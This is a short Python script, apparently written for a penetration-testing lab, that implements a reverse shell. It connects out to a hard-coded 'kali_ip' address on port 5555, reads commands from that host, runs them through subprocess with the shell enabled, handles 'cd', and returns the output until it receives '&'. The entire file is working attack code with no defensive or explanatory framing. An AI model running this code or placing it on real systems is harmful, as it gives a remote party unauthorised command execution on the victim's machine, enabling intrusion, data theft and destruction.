import socket
import subprocess 
import os

kali_ip = "10.0.2.4"
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((kali_ip, 5555))

s.send("Connected!\n".encode())

running = True
while(running):
	s.send("Enter Unix Command>".encode())
	received_data = s.recv(1024).decode()
	received_data = received_data.strip()
	datatolist = received_data.split()
	if(received_data != "&"):
		if(datatolist[0] == "cd"):
			os.chdir(datatolist[1])
		else:
			p = subprocess.run(datatolist, capture_output=True,shell=True)
			s.send((p.stdout.decode()).encode())
	else:
		s.close()
		break

